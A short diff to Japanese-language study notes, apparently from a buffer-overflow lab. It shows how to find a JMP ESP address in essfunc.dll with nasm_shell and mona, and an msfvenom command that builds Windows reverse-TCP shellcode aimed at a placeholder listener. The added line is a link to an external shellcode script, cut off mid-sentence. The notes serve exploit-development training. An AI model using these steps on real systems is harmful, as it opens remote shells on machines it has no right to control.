@@ -451,3 +451,4 @@
 - `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`で「JMP ESP」のアセンブリが「FFE4」と判明  
   デバッガで`!mona find -s "\xff\xe4" -m essfunc.dll`実行、「JMP ESP」のアドレスは「0x625011af」と判明
 - `msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -a x86 -b "\x00"`でシェルコード作成
+  [WIn_shellcode.py)](https://github.com/FishyStix12/WHPython_v1.1/blob/main/WIn_shellcode.py)の
